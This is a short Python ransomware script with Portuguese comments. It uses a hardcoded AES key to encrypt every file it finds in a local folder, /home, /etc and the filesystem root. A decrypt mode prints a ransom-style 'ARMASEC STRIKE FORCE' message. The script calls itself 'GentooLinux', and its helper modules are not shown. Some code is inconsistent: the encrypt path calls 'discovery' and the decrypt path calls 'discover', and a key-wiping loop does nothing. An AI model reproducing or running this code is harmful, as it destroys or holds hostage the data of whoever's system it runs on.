#! /usr/bin/python3.10
# -*- coding: utf-8 -*-
import Crypter
import Discovery
import secrets
import sys
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os


# --------------
# A senha pode ter os seguintes tamanhos
# 128/192/256 bits -1
# --------------

HARDCODED_KEY = b'7yLc5b5P5z5RJ94DKF5ZG36jwf5QePr5'


def arg_parser():
    parser = argparse.ArgumentParser(description="GentooLinux")
    parser.add_argument('-d', '--decrypt', help='decripta os arquivos [default: no]', action='store_true')
    return parser


def main():
    parser = arg_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('ARMASEC STRIKE FORCE')
        print('-----------------------------------------------------------------')
        print('Seus arquivos foram criptografados')
        print('Para decriptá-los utilize a seguinte senha: {}'.format(HARDCODED_KEY.decode()))
        key = input('Digite a senha: ').encode()
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY
    ctr = Counter.new(nbits=128, initial_value=0)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptFn = crypt.encrypt

        init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
        startDirs = [init_path, '/home', '/etc', '/']

        for currentDir in startDirs:
            for filename in Discovery.discovery(currentDir):
                Crypter.change_files(filename, cryptFn)

        # limpa a chave de criptografia da memória
        for _ in range(100):
            pass

        # Após a encriptação, você pode alterar o secure boot, wallpaper
        # código da zueira aqui
        pass

    else:
        cryptFn = crypt.decrypt

        init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
        startDirs = [init_path, '/home', '/etc', '/']

        for currentDir in startDirs:
            for filename in Discovery.discover(currentDir):
                Crypter.change_files(filename, cryptFn)

        # limpa a chave de criptografia da memória
        for _ in range(100):
            pass


if __name__ == '__main__':
    main()

